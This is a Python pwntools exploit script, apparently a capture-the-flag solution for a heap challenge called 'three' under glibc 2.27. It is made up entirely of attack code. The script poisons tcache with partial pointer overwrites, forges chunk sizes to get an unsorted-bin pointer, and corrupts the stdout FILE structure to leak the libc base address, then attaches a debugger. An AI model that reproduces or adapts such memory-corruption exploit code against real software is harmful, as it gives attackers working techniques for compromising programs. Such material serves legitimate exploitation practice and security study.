#coding=utf-8
from pwn import *
from pwn import *
#from change import *
from change_ld import *

context.terminal = ["terminator","-e"]
context.log_level = "debug"

#bin = change_ld("three",2.27)
#p = bin.process()
bin = change_ld("three","ld-2.27.so")
libc = ELF("./libc.so.6")
p = bin.process(env={"LD_PRELOAD":libc.path})

def Debug(cmd=""):
    gdb.attach(p)
    pause()

def new(content):
    p.sendlineafter("choice:","1")
    p.sendafter("content:",content)

def edit(idx,content):
    p.sendlineafter("choice:","2")
    p.sendlineafter("idx:",str(idx))
    p.sendafter("content:",content)

def delete(idx,choice):
    p.sendlineafter("choice:","3")
    p.sendlineafter("idx:",str(idx))
    p.sendlineafter("(y/n):",choice)

new("A"*0x8)#0
new("B"*0x8)#1
delete(0,"y")
delete(1,"n")
edit(1,"\x50\x70")
new("A"*8)#0z
new("B"*8)#2
delete(0,"y")
edit(2,p64(0)*3+'\x60\x70')
new("A"*0x8)
edit(2,p64(0)+p64(0x481))
delete(1,"y")
edit(0,p64(0)+'\xd0\x74')
new(p64(1)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
delete(0,"n")
edit(0,p64(0)+"\x60\xa7")
edit(2,p64(0)+p64(0x201))
delete(0,"y")
payload  = ""
payload += p64(0xfbad3c80) #_flags= ((stdout->flags & ~ _IO_NO_WRITES)|_IO_CURRENTLY_PUTTING)|_IO_IS_APPENDING
payload += p64(0)          #_IO_read_ptr
payload += p64(0)          #_IO_read_end
payload += p64(0)          #_IO_read_base
payload += "\x08"          # overwrite last byte of _IO_write_base to point to libc address
new(payload)
libc.address=u64(p.recv(6)+"\x00"*2)-0x3ed8b0
success("libc.address-->"+hex(libc.address))
Debug()
#delete(2,"no")